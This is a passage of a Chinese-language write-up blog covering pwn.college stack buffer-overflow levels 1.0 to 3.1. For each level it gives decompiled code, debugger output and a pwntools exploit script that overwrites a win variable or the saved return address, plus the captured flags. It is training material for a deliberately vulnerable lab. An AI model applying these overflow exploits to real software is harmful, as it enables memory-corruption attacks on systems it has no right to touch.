---
title: "Write-ups: Program Security (Memory Errors) series (Completed)"
published: 2024-12-05
updated: 2024-12-25
description: "Write-ups for pwn.college binary exploitation series."
image: "https://ghproxy.net/https://raw.githubusercontent.com/CuB3y0nd/picx-images-hosting/master/.pfmykyum0.avif"
tags: ["Pwn", "Write-ups"]
category: "Write-ups"
draft: false
---

# Level 1.0

## Information

- Category: Pwn

## Description

> Overflow a buffer on the stack to set the right conditions to obtain the flag!

## Write-up

分析得程序主要逻辑从 `challenge` 函数开始，反编译如下：

```c {9-10} del={55, 63} collapse={1-5, 14-51, 67-80, 59-59} ins={84-85}
__int64 __fastcall challenge(int a1, __int64 a2, __int64 a3)
{
  int *v3; // rax
  char *v4; // rax
  _QWORD v6[3]; // [rsp+0h] [rbp-50h] BYREF
  int v7; // [rsp+1Ch] [rbp-34h]
  int v8; // [rsp+24h] [rbp-2Ch]
  size_t nbytes; // [rsp+28h] [rbp-28h]
  _QWORD buf[2]; // [rsp+30h] [rbp-20h] BYREF
  _QWORD v11[2]; // [rsp+40h] [rbp-10h] BYREF
  __int64 savedregs; // [rsp+50h] [rbp+0h] BYREF
  _UNKNOWN *retaddr; // [rsp+58h] [rbp+8h] BYREF

  v7 = a1;
  v6[2] = a2;
  v6[1] = a3;
  v11[1] = __readfsqword(0x28u);
  buf[0] = 0LL;
  buf[1] = 0LL;
  v11[0] = 0LL;
  nbytes = 0LL;
  puts("The challenge() function has just been launched!");
  sp_ = (__int64)v6;
  bp_ = (__int64)&savedregs;
  sz_ = ((unsigned __int64)((char *)&savedregs - (char *)v6) >> 3) + 2;
  rp_ = (__int64)&retaddr;
  puts("Before we do anything, let's take a look at challenge()'s stack frame:");
  DUMP_STACK(sp_, sz_);
  printf("Our stack pointer points to %p, and our base pointer points to %p.\n", (const void *)sp_, (const void *)bp_);
  printf("This means that we have (decimal) %d 8-byte words in our stack frame,\n", sz_);
  puts("including the saved base pointer and the saved return address, for a");
  printf("total of %d bytes.\n", 8 * sz_);
  printf("The input buffer begins at %p, partway through the stack frame,\n", buf);
  puts("(\"above\" it in the stack are other local variables used by the function).");
  puts("Your input will be read into this buffer.");
  printf("The buffer is %d bytes long, but the program will let you provide an arbitrarily\n", 20);
  puts("large input length, and thus overflow the buffer.\n");
  puts("In this level, there is a \"win\" variable.");
  puts("By default, the value of this variable is zero.");
  puts("However, when this variable is non-zero, the flag will be printed.");
  puts("You can make this variable be non-zero by overflowing the input buffer.");
  printf(
    "The \"win\" variable is stored at %p, %d bytes after the start of your input buffer.\n\n",
    (char *)v11 + 4,
    20);
  puts("We have disabled the following standard memory corruption mitigations for this challenge:");
  puts("- the binary is *not* position independent. This means that it will be");
  puts("located at the same spot every time it is run, which means that by");
  puts("analyzing the binary (using objdump or reading this output), you can");
  puts("know the exact value that you need to overwrite the return address with.\n");
  cp_ = bp_;
  cv_ = __readfsqword(0x28u);
  while ( *(_QWORD *)cp_ != cv_ )
    cp_ -= 8LL;
  nbytes = 4096LL;
  printf("You have chosen to send %lu bytes of input!\n", 4096LL);
  printf("This will allow you to write from %p (the start of the input buffer)\n", buf);
  printf(
    "right up to (but not including) %p (which is %d bytes beyond the end of the buffer).\n",
    &buf[nbytes / 8],
    nbytes - 20);
  printf("Send your payload (up to %lu bytes)!\n", nbytes);
  v8 = read(0, buf, nbytes);
  if ( v8 < 0 )
  {
    v3 = __errno_location();
    v4 = strerror(*v3);
    printf("ERROR: Failed to read input -- %s!\n", v4);
    exit(1);
  }
  printf("You sent %d bytes!\n", v8);
  puts("Let's see what happened with the stack:\n");
  DUMP_STACK(sp_, sz_);
  puts("The program's memory status:");
  printf("- the input buffer starts at %p\n", buf);
  printf("- the saved frame pointer (of main) is at %p\n", (const void *)bp_);
  printf("- the saved return address (previously to main) is at %p\n", (const void *)rp_);
  printf("- the saved return address is now pointing to %p.\n", *(const void **)rp_);
  printf("- the canary is stored at %p.\n", (const void *)cp_);
  printf("- the canary value is now %p.\n", *(const void **)cp_);
  printf("- the address of the win variable is %p.\n", (char *)v11 + 4);
  printf("- the value of the win variable is 0x%x.\n", HIDWORD(v11[0]));
  putchar(10);
  if ( HIDWORD(v11[0]) )
    win();
  puts("Goodbye!");
  return 0LL;
}
```

注意到这里判断了 `v11[0]` 的高 32 bits。这时只要 `v11[0]` 的高 32 bits 不是 `0` 就都可以进入 `if` 内部，调用 `win`：

```c
if ( HIDWORD(v11[0]) ) { win(); }
```

所以我们要做的就是想办法覆盖 `v11[0]` 的高 32 bits。

```c
_QWORD buf[2]; // [rsp+30h] [rbp-20h] BYREF
_QWORD v11[2]; // [rsp+40h] [rbp-10h] BYREF

// ...

nbytes = 4096LL;
// ...
v8 = read(0, buf, nbytes);
```

这里 `read` 最多可以读取 4096 bytes 到 `buf`。但是我们的 `buf` 只有 16 bytes，故存在缓冲区溢出问题，导致覆盖 `v11` 的值。

所以我们只要先输入 16 bytes 填满 `buf`，再多写 5 bytes 就可以达到破坏 `v11[0]` 的高 32 bits 的目的。（注意 `read` 会把回车读进去，所以本地执行可以只输入 20 bytes）

## Exploit

```python
#!/usr/bin/python3

from pwn import context, ELF, process, remote, gdb

context(log_level="debug", terminal="kitty")

FILE = "./binary-exploitation-first-overflow-w"
HOST = "pwn.college"
PORT = 1337

gdbscript = """
c
"""


def launch(local=True, debug=False):
    if local:
        elf = ELF(FILE)
        context.binary = elf

        if debug:
            return gdb.debug([elf.path], gdbscript=gdbscript)
        else:
            return process([elf.path])
    else:
        return remote(HOST, PORT)


target = launch()

payload = b"A" * 21
target.send(payload)

target.recvall()
```

## Flag

Flag: `pwn.college{oQdReDoKIU218v6uPGguMuFOJnt.0VO4IDL5cTNxgzW}`

# Level 1.1

## Information

- Category: Pwn

## Description

> This challenge is identical to its "easy" version from a security perspective, but has the following changes:

1. Unlike the easy version, it does not give you helpful debug output. You will have to recover this information using a debugger.
2. For all other "hard" versions, the source code will not be provided, and you will need to reverse-engineer the binary using your knowledge of the "easy" version as a reference. However, for this one challenge, to get you familiar with the differences between the easy and hard versions, we will provide the source code.
3. Some randomization is different. Buffers might have different lengths, offsets might vary, etc. You will need to reverse engineer this information from the binary!

## Write-up

```c {5-6} del={13} ins={20-21} collapse={1-1}
__int64 challenge()
{
  int *v0; // rax
  char *v1; // rax
  _QWORD buf[4]; // [rsp+30h] [rbp-30h] BYREF
  int v4; // [rsp+50h] [rbp-10h]
  unsigned __int64 v5; // [rsp+58h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  memset(buf, 0, sizeof(buf));
  v4 = 0;
  printf("Send your payload (up to %lu bytes)!\n", 4096LL);
  if ( (int)read(0, buf, 0x1000uLL) < 0 )
  {
    v0 = __errno_location();
    v1 = strerror(*v0);
    printf("ERROR: Failed to read input -- %s!\n", v1);
    exit(1);
  }
  if ( v4 )
    win();
  puts("Goodbye!");
  return 0LL;
}
```

```c
_QWORD buf[4]; // [rsp+30h] [rbp-30h] BYREF
int v4; // [rsp+50h] [rbp-10h]

// ...

if ( (int)read(0, buf, 0x1000uLL) < 0 ) { /* ... */ }

// ...

if ( v4 ) { win(); }
```

由于程序根据 `v4` 的值来判断是否执行 `win`，所以只要令 `v4` 不为 0 即可。

注意到 `buf` 只有 32 bytes，但是最大可以输入 4096 bytes，导致溢出覆盖 `v4` 的值。

## Exploit

```python
#!/usr/bin/python3

from pwn import context, ELF, process, remote, gdb

context(log_level="debug", terminal="kitty")

FILE = "./binary-exploitation-first-overflow"
HOST = "pwn.college"
PORT = 1337

gdbscript = """
c
"""


def launch(local=True, debug=False):
    if local:
        elf = ELF(FILE)
        context.binary = elf

        if debug:
            return gdb.debug([elf.path], gdbscript=gdbscript)
        else:
            return process([elf.path])
    else:
        return remote(HOST, PORT)


target = launch()

payload = b"A" * 33
target.send(payload)

target.recvall()
```

## Flag

Flag: `pwn.college{cwWgAcBgDsBnGFTCky9i1NRqAtO.0FM5IDL5cTNxgzW}`

# Level 2.0

## Information

- Category: Pwn

## Description

> Overflow a buffer on the stack to set trickier conditions to obtain the flag!

## Write-up

```c {8-12, 22-25, 55} ins={84-85} del={63} collapse={1-4, 16-18, 29-51, 59-59, 67-80}
__int64 __fastcall challenge(int a1, __int64 a2, __int64 a3)
{
  int *v3; // rax
  char *v4; // rax
  _QWORD v6[3]; // [rsp+0h] [rbp-D0h] BYREF
  int v7; // [rsp+1Ch] [rbp-B4h]
  int v8; // [rsp+24h] [rbp-ACh]
  size_t nbytes; // [rsp+28h] [rbp-A8h] BYREF
  void *buf; // [rsp+30h] [rbp-A0h]
  int *v11; // [rsp+38h] [rbp-98h]
  _BYTE v12[128]; // [rsp+40h] [rbp-90h] BYREF
  int v13; // [rsp+C0h] [rbp-10h] BYREF
  unsigned __int64 v14; // [rsp+C8h] [rbp-8h]
  __int64 savedregs; // [rsp+D0h] [rbp+0h] BYREF
  _UNKNOWN *retaddr; // [rsp+D8h] [rbp+8h] BYREF

  v7 = a1;
  v6[2] = a2;
  v6[1] = a3;
  v14 = __readfsqword(0x28u);
  memset(v12, 0, sizeof(v12));
  v13 = 0;
  buf = v12;
  v11 = &v13;
  nbytes = 0LL;
  puts("The challenge() function has just been launched!");
  sp_ = (__int64)v6;
  bp_ = (__int64)&savedregs;
  sz_ = ((unsigned __int64)((char *)&savedregs - (char *)v6) >> 3) + 2;
  rp_ = (__int64)&retaddr;
  puts("Before we do anything, let's take a look at challenge()'s stack frame:");
  DUMP_STACK(sp_, sz_);
  printf("Our stack pointer points to %p, and our base pointer points to %p.\n", (const void *)sp_, (const void *)bp_);
  printf("This means that we have (decimal) %d 8-byte words in our stack frame,\n", sz_);
  puts("including the saved base pointer and the saved return address, for a");
  printf("total of %d bytes.\n", 8 * sz_);
  printf("The input buffer begins at %p, partway through the stack frame,\n", buf);
  puts("(\"above\" it in the stack are other local variables used by the function).");
  puts("Your input will be read into this buffer.");
  printf("The buffer is %d bytes long, but the program will let you provide an arbitrarily\n", 127);
  puts("large input length, and thus overflow the buffer.\n");
  puts("In this level, there is a \"win\" variable.");
  puts("By default, the value of this variable is zero.");
  puts("However, if you can set variable to 0x0e530e48, the flag will be printed.");
  puts("You can change this variable by overflowing the input buffer, but keep endianness in mind!");
  printf(
    "The \"win\" variable is stored at %p, %d bytes after the start of your input buffer.\n\n",
    v11,
    (_DWORD)v11 - (_DWORD)buf);
  cp_ = bp_;
  cv_ = __readfsqword(0x28u);
  while ( *(_QWORD *)cp_ != cv_ )
    cp_ -= 8LL;
  printf("Payload size: ");
  __isoc99_scanf("%lu", &nbytes);
  printf("You have chosen to send %lu bytes of input!\n", nbytes);
  printf("This will allow you to write from %p (the start of the input buffer)\n", buf);
  printf(
    "right up to (but not including) %p (which is %d bytes beyond the end of the buffer).\n",
    (char *)buf + nbytes,
    nbytes - 127);
  printf("Send your payload (up to %lu bytes)!\n", nbytes);
  v8 = read(0, buf, nbytes);
  if ( v8 < 0 )
  {
    v3 = __errno_location();
    v4 = strerror(*v3);
    printf("ERROR: Failed to read input -- %s!\n", v4);
    exit(1);
  }
  printf("You sent %d bytes!\n", v8);
  puts("Let's see what happened with the stack:\n");
  DUMP_STACK(sp_, sz_);
  puts("The program's memory status:");
  printf("- the input buffer starts at %p\n", buf);
  printf("- the saved frame pointer (of main) is at %p\n", (const void *)bp_);
  printf("- the saved return address (previously to main) is at %p\n", (const void *)rp_);
  printf("- the saved return address is now pointing to %p.\n", *(const void **)rp_);
  printf("- the canary is stored at %p.\n", (const void *)cp_);
  printf("- the canary value is now %p.\n", *(const void **)cp_);
  printf("- the address of the win variable is %p.\n", v11);
  printf("- the value of the win variable is 0x%x.\n", *v11);
  putchar(10);
  if ( *v11 == 240324168 )
    win();
  puts("Goodbye!");
  return 0LL;
}
```

```c
size_t nbytes; // [rsp+28h] [rbp-A8h] BYREF
void *buf; // [rsp+30h] [rbp-A0h]
int *v11; // [rsp+38h] [rbp-98h]
_BYTE v12[128]; // [rsp+40h] [rbp-90h] BYREF
int v13; // [rsp+C0h] [rbp-10h] BYREF

v13 = 0;
buf = v12;
v11 = &v13;
nbytes = 0LL;

// ...

__isoc99_scanf("%lu", &nbytes);

// ...

v8 = read(0, buf, nbytes);

// ...

if ( *v11 == 240324168 ) { win(); }
```

如果 `v11` 指向的地址的内容为 `240324168` 则触发 `win`。

注意到我们的 `buf` 为 128 bytes，由于最大输入长度可由我们自己自定义，因此可以溢出 `buf` 破坏 `v13`，将 `v13` 修改为 `240324168` 即可。

## Exploit

```python
#!/usr/bin/python3

from pwn import context, ELF, process, remote, gdb, p64

context(log_level="debug", terminal="kitty")

FILE = "./babymem-level-2-0"
HOST = "pwn.college"
PORT = 1337

gdbscript = """
c
"""


def launch(local=True, debug=False):
    if local:
        elf = ELF(FILE)
        context.binary = elf

        if debug:
            return gdb.debug([elf.path], gdbscript=gdbscript)
        else:
            return process([elf.path])
    else:
        return remote(HOST, PORT)


target = launch()

payload = b"".ljust(128, b"A") + p64(240324168)
payload_size = str(len(payload)).encode()

target.recvuntil(b"Payload size: ")
target.sendline(payload_size)
target.recvuntil(b"Send your payload")
target.send(payload)

target.recvall()
```

## Flag

Flag: `pwn.college{w7aHpdU-9AlFvJ5GtohCFtGwF7M.ddTNzMDL5cTNxgzW}`

# Level 2.1

## Information

- Category: Pwn

## Description

> Overflow a buffer on the stack to set trickier conditions to obtain the flag!

## Write-up

```c {5-9, 15-16, 19} ins={28-29} del={21} collapse={1-1}
__int64 challenge()
{
  int *v0; // rax
  char *v1; // rax
  size_t nbytes; // [rsp+28h] [rbp-38h] BYREF
  void *buf; // [rsp+30h] [rbp-30h]
  _DWORD *v5; // [rsp+38h] [rbp-28h]
  _QWORD v6[2]; // [rsp+40h] [rbp-20h] BYREF
  _QWORD v7[2]; // [rsp+50h] [rbp-10h] BYREF

  v7[1] = __readfsqword(0x28u);
  v6[0] = 0LL;
  v6[1] = 0LL;
  v7[0] = 0LL;
  buf = v6;
  v5 = (_DWORD *)v7 + 1;
  nbytes = 0LL;
  printf("Payload size: ");
  __isoc99_scanf("%lu", &nbytes);
  printf("Send your payload (up to %lu bytes)!\n", nbytes);
  if ( (int)read(0, buf, nbytes) < 0 )
  {
    v0 = __errno_location();
    v1 = strerror(*v0);
    printf("ERROR: Failed to read input -- %s!\n", v1);
    exit(1);
  }
  if ( *v5 == 758965894 )
    win();
  puts("Goodbye!");
  return 0LL;
}
```

令 `v5` 指向的地址处的值为 `758965894` 即可触发 `win`。

最大输入大小可由我们自定义，存在溢出问题。`buf` 的大小为 16 bytes，溢出后可以覆盖 `v7`。

`v5` 为指向 `v7` 的 `_DWORD + 1` 处的地址，所以覆盖 `buf` 后需要加一个 `_DWORD` 才是最终地址。

```asm showLineNumbers=false wrap=false {92-94, 113-114} collapse={13-32, 37-66, 72-91, 98-109, 118-121}
pwndbg> r
Starting program: /home/cub3y0nd/Projects/pwn.college/babymem-level-2-1
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/usr/lib/libthread_db.so.1".
###
### Welcome to /home/cub3y0nd/Projects/pwn.college/babymem-level-2-1!
###

Payload size: 1771
Send your payload (up to 1771 bytes)!

Breakpoint 1, 0x000055555555619d in challenge ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
───────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────────────
 RAX  0x7fffffffd180 ◂— 0
 RBX  0x7fffffffe308 —▸ 0x7fffffffe6bb ◂— '/home/cub3y0nd/Projects/pwn.college/babymem-level-2-1'
 RCX  0
 RDX  0x6eb
 RDI  0
 RSI  0x7fffffffd180 ◂— 0
 R8   0x75
 R9   0xfffffffc
 R10  0
 R11  0x202
 R12  1
 R13  0
 R14  0x7ffff7ffd000 (_rtld_global) —▸ 0x7ffff7ffe2e0 —▸ 0x555555554000 ◂— 0x10102464c457f
 R15  0
 RBP  0x7fffffffd1a0 —▸ 0x7fffffffe1e0 —▸ 0x7fffffffe280 —▸ 0x7fffffffe2e0 ◂— 0
 RSP  0x7fffffffd140 —▸ 0x555555557175 ◂— 0x2023232300232323 /* '###' */
 RIP  0x55555555619d (challenge+171) ◂— call 0x555555555180
────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────────────────────
 ► 0x55555555619d <challenge+171>    call   read@plt                    <read@plt>
        fd: 0 (/dev/pts/0)
        buf: 0x7fffffffd180 ◂— 0
        nbytes: 0x6eb

   0x5555555561a2 <challenge+176>    mov    dword ptr [rbp - 0x3c], eax
   0x5555555561a5 <challenge+179>    cmp    dword ptr [rbp - 0x3c], 0
   0x5555555561a9 <challenge+183>    jns    challenge+229               <challenge+229>

   0x5555555561ab <challenge+185>    call   __errno_location@plt        <__errno_location@plt>

   0x5555555561b0 <challenge+190>    mov    eax, dword ptr [rax]
   0x5555555561b2 <challenge+192>    mov    edi, eax
   0x5555555561b4 <challenge+194>    call   strerror@plt                <strerror@plt>

   0x5555555561b9 <challenge+199>    mov    rsi, rax
   0x5555555561bc <challenge+202>    lea    rdi, [rip + 0xf85]     RDI => 0x555555557148 ◂— 'ERROR: Failed to read input -- %s!\n'
   0x5555555561c3 <challenge+209>    mov    eax, 0                 EAX => 0
─────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp 0x7fffffffd140 —▸ 0x555555557175 ◂— 0x2023232300232323 /* '###' */
01:0008│-058 0x7fffffffd148 —▸ 0x7fffffffe318 —▸ 0x7fffffffe6f1 ◂— 'SHELL=/usr/bin/zsh'
02:0010│-050 0x7fffffffd150 —▸ 0x7fffffffe308 —▸ 0x7fffffffe6bb ◂— '/home/cub3y0nd/Projects/pwn.college/babymem-level-2-1'
03:0018│-048 0x7fffffffd158 ◂— 0x155559020
04:0020│-040 0x7fffffffd160 —▸ 0x7fffffffd1a0 —▸ 0x7fffffffe1e0 —▸ 0x7fffffffe280 —▸ 0x7fffffffe2e0 ◂— ...
05:0028│-038 0x7fffffffd168 ◂— 0x6eb
06:0030│-030 0x7fffffffd170 —▸ 0x7fffffffd180 ◂— 0
07:0038│-028 0x7fffffffd178 —▸ 0x7fffffffd194 ◂— 0xf7a9ac0000000000
───────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────
 ► 0   0x55555555619d challenge+171
   1   0x5555555562ea main+213
   2   0x7ffff7dcae08
   3   0x7ffff7dcaecc __libc_start_main+140
   4   0x55555555520e _start+46
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> c
Continuing.
aaaaaaaabaaaaaaa

Breakpoint 3, 0x00005555555561d7 in challenge ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
───────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────────────
*RAX  0x11
 RBX  0x7fffffffe308 —▸ 0x7fffffffe6bb ◂— '/home/cub3y0nd/Projects/pwn.college/babymem-level-2-1'
*RCX  0x7ffff7eb0c21 (read+17) ◂— cmp rax, -0x1000 /* 'H=' */
 RDX  0x6eb
 RDI  0
 RSI  0x7fffffffd180 ◂— 'aaaaaaaabaaaaaaa\n'
 R8   0x75
 R9   0xfffffffc
 R10  0
*R11  0x246
 R12  1
 R13  0
 R14  0x7ffff7ffd000 (_rtld_global) —▸ 0x7ffff7ffe2e0 —▸ 0x555555554000 ◂— 0x10102464c457f
 R15  0
 RBP  0x7fffffffd1a0 —▸ 0x7fffffffe1e0 —▸ 0x7fffffffe280 —▸ 0x7fffffffe2e0 ◂— 0
 RSP  0x7fffffffd140 —▸ 0x555555557175 ◂— 0x2023232300232323 /* '###' */
*RIP  0x5555555561d7 (challenge+229) ◂— mov rax, qword ptr [rbp - 0x28]
────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────────────────────
 ► 0x5555555561d7 <challenge+229>    mov    rax, qword ptr [rbp - 0x28]     RAX, [0x7fffffffd178] => 0x7fffffffd194 ◂— 0xf7a9ac0000000000
   0x5555555561db <challenge+233>    mov    eax, dword ptr [rax]            EAX, [0x7fffffffd194] => 0
   0x5555555561dd <challenge+235>    cmp    eax, 0x2d3ce686                 0x0 - 0x2d3ce686     EFLAGS => 0x293 [ CF pf AF zf SF IF df of ]
   0x5555555561e2 <challenge+240>  ✔ jne    challenge+252               <challenge+252>
    ↓
   0x5555555561ee <challenge+252>    lea    rdi, [rip + 0xf77]              RDI => 0x55555555716c ◂— 'Goodbye!'
   0x5555555561f5 <challenge+259>    call   puts@plt                    <puts@plt>

   0x5555555561fa <challenge+264>    mov    eax, 0                       EAX => 0
   0x5555555561ff <challenge+269>    mov    rcx, qword ptr [rbp - 8]
   0x555555556203 <challenge+273>    xor    rcx, qword ptr fs:[0x28]
   0x55555555620c <challenge+282>    je     challenge+289               <challenge+289>

   0x55555555620e <challenge+284>    call   __stack_chk_fail@plt        <__stack_chk_fail@plt>
─────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp 0x7fffffffd140 —▸ 0x555555557175 ◂— 0x2023232300232323 /* '###' */
01:0008│-058 0x7fffffffd148 —▸ 0x7fffffffe318 —▸ 0x7fffffffe6f1 ◂— 'SHELL=/usr/bin/zsh'
02:0010│-050 0x7fffffffd150 —▸ 0x7fffffffe308 —▸ 0x7fffffffe6bb ◂— '/home/cub3y0nd/Projects/pwn.college/babymem-level-2-1'
03:0018│-048 0x7fffffffd158 ◂— 0x155559020
04:0020│-040 0x7fffffffd160 ◂— 0x11ffffd1a0
05:0028│-038 0x7fffffffd168 ◂— 0x6eb
06:0030│-030 0x7fffffffd170 —▸ 0x7fffffffd180 ◂— 'aaaaaaaabaaaaaaa\n'
07:0038│-028 0x7fffffffd178 —▸ 0x7fffffffd194 ◂— 0xf7a9ac0000000000
───────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────
 ► 0   0x5555555561d7 challenge+229
   1   0x5555555562ea main+213
   2   0x7ffff7dcae08
   3   0x7ffff7dcaecc __libc_start_main+140
   4   0x55555555520e _start+46
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> x/wx $rbp-0x28
0x7fffffffd178: 0xffffd194
pwndbg> p/x 0x194-0x180
$4 = 0x14
```

算出来 padding 大小是 `0x14`。

## Exploit

```python
#!/usr/bin/python3

from pwn import context, ELF, process, remote, gdb, p64

context(log_level="debug", terminal="kitty")

FILE = "./babymem-level-2-1"
HOST = "pwn.college"
PORT = 1337

gdbscript = """
c
"""


def launch(local=True, debug=False):
    if local:
        elf = ELF(FILE)
        context.binary = elf

        if debug:
            return gdb.debug([elf.path], gdbscript=gdbscript)
        else:
            return process([elf.path])
    else:
        return remote(HOST, PORT)


target = launch()

payload = b"".ljust(0x14, b"A") + p64(758965894)
payload_size = str(len(payload)).encode()

target.recvuntil(b"Payload size: ")
target.sendline(payload_size)
target.recvuntil(b"Send your payload")
target.send(payload)

target.recvall()
```

## Flag

Flag: `pwn.college{sZCPUpjO4U6HmvntMr91HLyNljf.dhTNzMDL5cTNxgzW}`

# Level 3.0

## Information

- Category: Pwn

## Description

> Overflow a buffer and smash the stack to obtain the flag!

## Write-up

```plaintext wrap=false showLineNumbers=false "88 bytes after the start of your input buffer." collapse={1-38,46-55}
###
### Welcome to ./babymem-level-3-0!
###

The challenge() function has just been launched!
Before we do anything, let's take a look at challenge()'s stack frame:
+---------------------------------+-------------------------+--------------------+
|                  Stack location |            Data (bytes) |      Data (LE int) |
+---------------------------------+-------------------------+--------------------+
| 0x00007ffd41f77580 (rsp+0x0000) | b0 75 f7 41 fd 7f 00 00 | 0x00007ffd41f775b0 |
| 0x00007ffd41f77588 (rsp+0x0008) | 68 87 f7 41 fd 7f 00 00 | 0x00007ffd41f78768 |
| 0x00007ffd41f77590 (rsp+0x0010) | 58 87 f7 41 fd 7f 00 00 | 0x00007ffd41f78758 |
| 0x00007ffd41f77598 (rsp+0x0018) | 0b a7 02 f9 01 00 00 00 | 0x00000001f902a70b |
| 0x00007ffd41f775a0 (rsp+0x0020) | 1e 3e 40 00 00 00 00 00 | 0x0000000000403e1e |
| 0x00007ffd41f775a8 (rsp+0x0028) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffd41f775b0 (rsp+0x0030) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffd41f775b8 (rsp+0x0038) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffd41f775c0 (rsp+0x0040) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffd41f775c8 (rsp+0x0048) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffd41f775d0 (rsp+0x0050) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffd41f775d8 (rsp+0x0058) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffd41f775e0 (rsp+0x0060) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffd41f775e8 (rsp+0x0068) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffd41f775f0 (rsp+0x0070) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffd41f775f8 (rsp+0x0078) | b0 75 f7 41 fd 7f 00 00 | 0x00007ffd41f775b0 |
| 0x00007ffd41f77600 (rsp+0x0080) | 30 86 f7 41 fd 7f 00 00 | 0x00007ffd41f78630 |
| 0x00007ffd41f77608 (rsp+0x0088) | 51 2a 40 00 00 00 00 00 | 0x0000000000402a51 |
+---------------------------------+-------------------------+--------------------+
Our stack pointer points to 0x7ffd41f77580, and our base pointer points to 0x7ffd41f77600.
This means that we have (decimal) 18 8-byte words in our stack frame,
including the saved base pointer and the saved return address, for a
total of 144 bytes.
The input buffer begins at 0x7ffd41f775b0, partway through the stack frame,
("above" it in the stack are other local variables used by the function).
Your input will be read into this buffer.
The buffer is 68 bytes long, but the program will let you provide an arbitrarily
large input length, and thus overflow the buffer.

In this level, there is no "win" variable.
You will need to force the program to execute the win() function
by directly overflowing into the stored return address back to main,
which is stored at 0x7ffd41f77608, 88 bytes after the start of your input buffer.
That means that you will need to input at least 96 bytes (68 to fill the buffer,
20 to fill other stuff stored between the buffer and the return address,
and 8 that will overwrite the return address).

We have disabled the following standard memory corruption mitigations for this challenge:
- the canary is disabled, otherwise you would corrupt it before
overwriting the return address, and the program would abort.
- the binary is *not* position independent. This means that it will be
located at the same spot every time it is run, which means that by
analyzing the binary (using objdump or reading this output), you can
know the exact value that you need to overwrite the return address with.

Payload size:
```

程序直接告诉我们目的和需要多大的 padding 了，所以接下来直接找 `win` 的地址就好了。

直接上 pwndbg 查 `win` 函数地址：

```asm wrap=false ins="0x0000000000402331"
pwndbg> i fun
All defined functions:

Non-debugging symbols:
0x0000000000401000  _init
0x00000000004010f0  putchar@plt
0x0000000000401100  __errno_location@plt
0x0000000000401110  puts@plt
0x0000000000401120  write@plt
0x0000000000401130  printf@plt
0x0000000000401140  geteuid@plt
0x0000000000401150  read@plt
0x0000000000401160  setvbuf@plt
0x0000000000401170  open@plt
0x0000000000401180  __isoc99_scanf@plt
0x0000000000401190  exit@plt
0x00000000004011a0  strerror@plt
0x00000000004011b0  _start
0x00000000004011e0  _dl_relocate_static_pie
0x00000000004011f0  deregister_tm_clones
0x0000000000401220  register_tm_clones
0x0000000000401260  __do_global_dtors_aux
0x0000000000401290  frame_dummy
0x0000000000401296  DUMP_STACK
0x0000000000401499  bin_padding
0x0000000000402331  win
0x0000000000402438  challenge
0x000000000040298b  main
0x0000000000402a70  __libc_csu_init
0x0000000000402ae0  __libc_csu_fini
0x0000000000402ae8  _fini
```

## Exploit

```python
#!/usr/bin/python3

from pwn import context, ELF, process, remote, gdb, p64

context(log_level="debug", terminal="kitty")

FILE = "./babymem-level-3-0"
HOST = "pwn.college"
PORT = 1337

gdbscript = """
c
"""


def launch(local=True, debug=False):
    if local:
        elf = ELF(FILE)
        context.binary = elf

        if debug:
            return gdb.debug([elf.path], gdbscript=gdbscript)
        else:
            return process([elf.path])
    else:
        return remote(HOST, PORT)


target = launch()

payload = b"".ljust(88, b"A") + p64(0x402331)
payload_size = str(len(payload)).encode()

target.recvuntil(b"Payload size: ")
target.sendline(payload_size)
target.recvuntil(b"Send your payload")
target.send(payload)

target.recvall()
```

## Flag

Flag: `pwn.college{0omKd6AgzV5NaakXpbDyYSre3hD.01M5IDL5cTNxgzW}`

# Level 3.1

## Information

- Category: Pwn

## Description

> Overflow a buffer and smash the stack to obtain the flag!

## Write-up

```c del={20} collapse={1-16, 24-30}
__int64 challenge()
{
  int *v0; // rax
  char *v1; // rax
  size_t nbytes; // [rsp+28h] [rbp-88h] BYREF
  _QWORD v4[13]; // [rsp+30h] [rbp-80h] BYREF
  int v5; // [rsp+98h] [rbp-18h]
  __int16 v6; // [rsp+9Ch] [rbp-14h]
  int v7; // [rsp+A4h] [rbp-Ch]
  void *buf; // [rsp+A8h] [rbp-8h]

  memset(v4, 0, sizeof(v4));
  v5 = 0;
  v6 = 0;
  buf = v4;
  nbytes = 0LL;
  printf("Payload size: ");
  __isoc99_scanf("%lu", &nbytes);
  printf("Send your payload (up to %lu bytes)!\n", nbytes);
  v7 = read(0, buf, nbytes);
  if ( v7 < 0 )
  {
    v0 = __errno_location();
    v1 = strerror(*v0);
    printf("ERROR: Failed to read input -- %s!\n", v1);
    exit(1);
  }
  puts("Goodbye!");
  return 0LL;
}
```

```asm wrap=false ins="0x0000000000401a0b" collapse={2-21, 29-30, 36-90, 109-128, 133-162} {131}
